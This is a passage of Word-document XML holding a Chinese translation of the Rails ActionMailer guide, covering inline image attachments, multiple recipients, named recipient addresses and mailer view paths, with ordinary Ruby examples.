          <w:p w14:paraId="45C0028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:content</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; encoded_content }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B78F59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如果你用了一种指定的编码形式， Mail　将会认为你的内容是已经经过编码的，并不再尝试地对其内容进行　Base64 编码.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A719FDB"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2.3.3 创建内联附件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040E68C8" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="266"/>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首先，要通知 Mail 将一个附件转换成内联附件，你需要调用 Mailer 附件方法之中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>#inline</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 函数。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5D28614C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37D67A6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def</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>welcome</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A23832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attachments.inline['image.jpg'] = File.read('/path/to/image.jpg')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F6B946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71297773" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="267"/>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然后在你的视图中，你可以指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attachments[]</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为一个哈希参数来传入你想要展示的附件，调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ,然后把结果传入 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法中去：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="56C0B89B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5ED8649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&lt;p&gt;Hello there, this is our image&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E990CB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4088AF7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image_tag attachments['image.jpg'].url %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A76F19E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="268"/>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这里以默认选项调用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法,你可以在这里象对待其他图像一样处理内联附件，在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 后面加上一些参数。</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22057787" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0020160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&lt;p&gt;Hello there, this is our image&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69FA36B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3F12672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image_tag attachments['image.jpg'].url, :alt</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'My Photo',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="400BDC0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:class</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos'</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46C72E3D"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2.3.4 发送多个收件人的信件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6245BCD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你可以为你的邮件加入多个的收件人（例如每当有一个新用户注册就通知所有的管理员。）,你需要给邮件中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:to</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数设定一个列表。这个列表可以用数组的形式，也可以用以逗号隔开的email地址的字符串组成.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="46C12590" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="286A666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AdminMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14E7AFF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default :to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; Proc.new</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{ Admin.pluck(:email) },</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1756B78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:from</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "notification@example.com"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74CB883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3F366FF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new_registration(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26722E7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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="056DA65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mail(:subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "New User Signup: #{@user.email}")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A92E49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505778C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7ACAD2C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对应地，用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cc</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:bcc</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以对carbon copy 和 blind carbon copy 可以进行同样的设置，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5205622E"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2.3.5 发送带名字的邮件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33944D9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有时候，你想要收件人在邮件地址的地方现实一个名字来代替地址信息，想要做到这个需要一个小技巧，就是把你的邮件地址用</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>“Name &lt;email&gt;”</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的格式编写就可以了。</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68B08755" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B723DC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def</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>welcome_email(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48B8C88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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73F260B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email_with_name = "#{@user.name} &lt;#{@user.email}&gt;"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="347680F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mail(:to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; email_with_name, :subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Welcome to My Awesome Site")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="413D534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5744BF17"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2.4 Mailer Views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0363AED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Mailer 试图位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/name_of_mailer_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下，通常情况下，mailer 视图的名字要和 mailer 里面的方法相对应，在我们上面的例子当中，我们的 mailer 方法 welcome_email</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对应的HTML版就应该位于</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>app/views/user_mailer/welcome_email.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ,而文字版视图文件应该位于</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>welcome_email.text.erb+ .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2236837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如果要对此默认的设置做出更改，你需要做一点这样的工作:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="01E9FC6F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="205EF3A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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75B7268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default :from</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "notifications@example.com"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E4F3FA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114A8FE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welcome_email(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="747FC31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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="646C6DA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@url</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= "</w:t>
            </w:r>
            <w:hyperlink r:id="rId609" w:history="1">
              <w:r w:rsidRPr="004E5E0B">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://example.com/login</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EB8465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mail(:to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
